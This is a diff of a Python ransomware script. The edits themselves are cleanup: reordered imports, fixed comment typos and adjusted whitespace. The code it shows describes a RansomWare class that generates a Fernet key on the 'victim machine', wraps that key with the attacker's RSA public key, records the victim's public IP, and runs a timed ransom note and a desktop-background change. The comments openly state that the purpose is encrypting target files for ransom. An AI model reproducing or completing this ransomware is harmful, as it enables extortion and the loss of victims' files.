@@ -1,21 +1,21 @@
-import os
-os.environ["CRYPTOGRAPHY_OPENSSL_NO_LEGACY"] = "1"
-# Imports
-from cryptography.fernet import Fernet  # encrypt/decrypt files on target system
+# Local Imports
 import os  # to get system root
-import webbrowser  # to load webbrowser to go to specific website eg bitcoin
-import ctypes  # so we can intereact with windows dlls and change windows background etc
+import webbrowser  # to load browser to go to specific website eg bitcoin
+import ctypes  # so we can interact with windows dlls and change windows background etc
 import urllib.request  # used for downloading and saving background image
 import requests  # used to make get reqeust to api.ipify.org to get target machine ip addr
 import time  # used to time.sleep interval for ransom note & check desktop to decrypt system/files
 import datetime  # to give time limit on ransom note
 import subprocess  # to create process for notepad and open ransom  note
-import win32gui  # used to get window text to see if ransom note is on top of all other windows
-from Crypto.PublicKey import RSA
-# from Crypto.Random import get_random_bytes
-from Crypto.Cipher import AES, PKCS1_OAEP
-# import base64
+import win32gui  # used to get window text to see if ransom note is on top of all others windows
 import threading  # used for ransom note and decryption key on desktop
+
+# Framework Imports
+from cryptography.fernet import Fernet  # encrypt/decrypt files on target system
+from Crypto.PublicKey import RSA
+from Crypto.Cipher import PKCS1_OAEP
+
+os.environ["CRYPTOGRAPHY_OPENSSL_NO_LEGACY"] = "1"
 
 
 class RansomWare:
@@ -26,7 +26,6 @@ class RansomWare:
         # We comment out 'png' so that we can see the RansomWare only encrypts specific files that we have chosen-
         # -and leaves other files un-ecnrypted etc.
         # 'png',
-
     ]
 
     def __init__(self):
@@ -44,7 +43,8 @@ class RansomWare:
         '''
         # Use sysroot to create absolute path for files, etc. And for encrypting whole system
         self.sysRoot = os.path.expanduser('~')
-        # Use localroot to test encryption softawre and for absolute path for files and encryption of "test system"
+        # Use localroot to test encryption software and for absolute path for files and encryption of
+        # "test system"
         self.localRoot = r'C:\Users\Maaz\Documents\Python-Ransomware\localRoot'  # Debugging/Testing
 
         # Get public IP of person, for more analysis etc. (Check if you have hit gov, military ip space LOL)
@@ -52,8 +52,8 @@ class RansomWare:
 
     # Generates [SYMMETRIC KEY] on victim machine which is used to encrypt the victims data
     def generate_key(self):
-        # Generates a url safe(base64 encoded) key
-        self.key =  Fernet.generate_key()
+        # Generates url safe(base64 encoded) key
+        self.key = Fernet.generate_key()
         # Creates a Fernet object with encrypt/decrypt methods
         self.crypter = Fernet(self.key)
     
@@ -63,7 +63,7 @@ class RansomWare:
             f.write(self.key)
 
     # Encrypt [SYMMETRIC KEY] that was created on victim machine to Encrypt/Decrypt files with our PUBLIC ASYMMETRIC-
-    # -RSA key that was created on OUR MACHINE. We will later be able to DECRYPT the SYSMETRIC KEY used for-
+    # -RSA key that was created on OUR MACHINE. We will later be able to DECRYPT the SYMMETRIC KEY used for-
     # -Encrypt/Decrypt of files on target machine with our PRIVATE KEY, so that they can then Decrypt files etc.
     def encrypt_fernet_key(self):
         with open('fernet_key.txt', 'rb') as fk:
